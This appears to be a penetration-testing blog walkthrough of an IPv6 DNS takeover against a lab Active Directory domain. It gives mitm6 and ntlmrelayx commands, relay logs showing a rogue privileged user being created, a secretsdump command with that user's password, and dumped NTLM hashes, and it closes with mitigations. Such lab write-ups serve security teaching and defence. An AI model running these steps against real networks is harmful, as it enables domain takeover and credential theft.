---
layout:	post
title:  "AD Initial-Attacks: IPv6 DNS Takeover"
date:   2024-07-22 11:11:11 +0200
categories: [Active Directory]
tags: [Active Directory]
---

## Pre-requisites

[AD: Fundamentals (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Fundamentals/)

<br>

## AD Environment

The AD environment for the IPv6 DNS Takeover walkthrough is illustrated in the image below.

![AD Environment](/images/2024-07-22-AD_Initial_Attacks_IPv6_DNS_Takeover/1.png)

<br>

## IPv6 DNS Takeover

Many network primarily use IPv4 but also have IPv6 enabled. Often IPv6 DNS server is not configured. So, there is usually nothing that does the DNS for IPv6. Attacker can take advantage of this **misconfiguration** and spoof as IPv6 DNS server to carry out MITM attack.

To carry out the attack, we will use ntlmrelayx and mitm6 tools from ‘hecker’ machine. Execute ntlmrelayx with the following command to relay IPv6 traffic to DC.  

```bash
ntlmrelayx.py -6 -t ldaps://192.168.190.130 -wh wpad.APEWITHINTERNET.local -l Out
```

Then, mitm6 was executed with following command to spoof and intercept IPv6 traffic. Make sure to use this in short sprints of 5-10 minutes in production environment as it can cause network outages.

```bash
sudo mitm6 -d APEWITHINTERNET.local
```

Now, when any event occur on the network like machine startup/reboot or user logins, they will be intercepted and relayed to DC.

When PC1 startup/reboot, the PC will try to authenticate to spoofed ‘hecker’ machine which will be relayed to DC.  

```bash
*] HTTPD: Received connection from ::ffff:192.168.190.129, attacking target ldaps://192.168.190.130
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.190.129
[*] HTTPD: Received connection from ::ffff:192.168.190.129, attacking target ldaps://192.168.190.130
[*] HTTPD: Received connection from ::ffff:192.168.190.129, attacking target ldaps://192.168.190.130
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Received connection from ::ffff:192.168.190.129, attacking target ldaps://192.168.190.130
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Received connection from ::ffff:192.168.190.129, attacking target ldaps://192.168.190.130
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] Authenticating against ldaps://192.168.190.130 as APEWITHINTERNET\PC1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Authenticating against ldaps://192.168.190.130 as APEWITHINTERNET\PC1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

Additionally, it uses ldapdomaindump to dump out various object information like users, computers, groups, policy, trusts, etc, in various file format which are listed below.  This can be useful for enumeration.

```bash
-rw-rw-r-- 1 kali kali  2209 Jul 21 14:28 domain_computers_by_os.html
-rw-rw-r-- 1 kali kali   706 Jul 21 14:28 domain_computers.grep
-rw-rw-r-- 1 kali kali  1873 Jul 21 14:28 domain_computers.html
-rw-rw-r-- 1 kali kali 12180 Jul 21 14:28 domain_computers.json
-rw-rw-r-- 1 kali kali 10202 Jul 21 14:28 domain_groups.grep
-rw-rw-r-- 1 kali kali 17213 Jul 21 14:28 domain_groups.html
-rw-rw-r-- 1 kali kali 82546 Jul 21 14:28 domain_groups.json
-rw-rw-r-- 1 kali kali   267 Jul 21 14:28 domain_policy.grep
-rw-rw-r-- 1 kali kali  1163 Jul 21 14:28 domain_policy.html
-rw-rw-r-- 1 kali kali  5458 Jul 21 14:28 domain_policy.json
-rw-rw-r-- 1 kali kali    71 Jul 21 14:28 domain_trusts.grep
-rw-rw-r-- 1 kali kali   828 Jul 21 14:28 domain_trusts.html
-rw-rw-r-- 1 kali kali     2 Jul 21 14:28 domain_trusts.json
-rw-rw-r-- 1 kali kali 18519 Jul 21 14:28 domain_users_by_group.html
-rw-rw-r-- 1 kali kali  2177 Jul 21 14:28 domain_users.grep
-rw-rw-r-- 1 kali kali  8223 Jul 21 14:28 domain_users.html
-rw-rw-r-- 1 kali kali 18589 Jul 21 14:28 domain_users.json
```

Also, when user try to login, they will try to authenticate to spoofed ‘hecker’ machine which will be relayed to DC. 

```bash
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=APEWITHINTERNET,DC=local
[*] Adding new user with username: CBHOxNqxcU and password: Dm=:S12UF7h2=h~ result: OK
[*] Querying domain security descriptor
[*] Success! User CBHOxNqxcU now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20240721-143455.restore
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting
```

As can be seen in above output, it created a user named ‘CBHOxNqxcU’ with password ‘Dm=:S12UF7h2=h~’, which is verified below..

![AD Environment](/images/2024-07-22-AD_Initial_Attacks_IPv6_DNS_Takeover/2.png)

<br>

## Additional

Since the tool creates a user. We can use that user to dump out NTDS.DIT as can be seen below. The dumped hash can be later cracked offline.

```bash
secretsdump.py APEWITHINTERNET/CBHOxNqxcU:Dm=:S12UF7h2=h~@192.168.190.130 -just-dc-ntlm
```

```bash
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:064fbbe5db9939f23459813a58e24a78:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff99a9aaf9780bb473a16a218c7a3848:::
APEWITHINTERNET.local\ape:1103:aad3b435b51404eeaad3b435b51404ee:f7ea8d7ec5f7ccf8e50b661ee29f8ee0:::
APEWITHINTERNET.local\monkee:1104:aad3b435b51404eeaad3b435b51404ee:868af3862be0f5859ab56ca33330d795:::
APEWITHINTERNET.local\chimp:1105:aad3b435b51404eeaad3b435b51404ee:fc15b4e40a055ef9b1937538e61ab5c6:::
APEWITHINTERNET.local\SQLService:1106:aad3b435b51404eeaad3b435b51404ee:b5d902ffca907a7cb1d8fb9bf4dbb0bd:::
CBHOxNqxcU:1111:aad3b435b51404eeaad3b435b51404ee:025a288deddf795bb558cf658a90fb4c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:0fd99f8be51a76a7237ab34a1f58e218:::
PC2$:1109:aad3b435b51404eeaad3b435b51404ee:0ecc239e48df9c0052227ddbd282984f:::
PC1$:1110:aad3b435b51404eeaad3b435b51404ee:0a6696279f7963e540d35e0e760a2b62:::
[*] Cleaning up... 
```

<br>

## Mitigations

- If IPv6 is not used, block DHCPv6 traffic via Windows Firewall Group Policy
    - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
    - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
    - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)
- Enable LDAP signing and LDAP channel binding to avoid LDAP/LDAPS relay
- If WPAD is not used, disable it via registry
    - Set ‘HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc\Start’ value to 4
- Add high privileges users to Protected Users group to prevent impersonation of user via delegation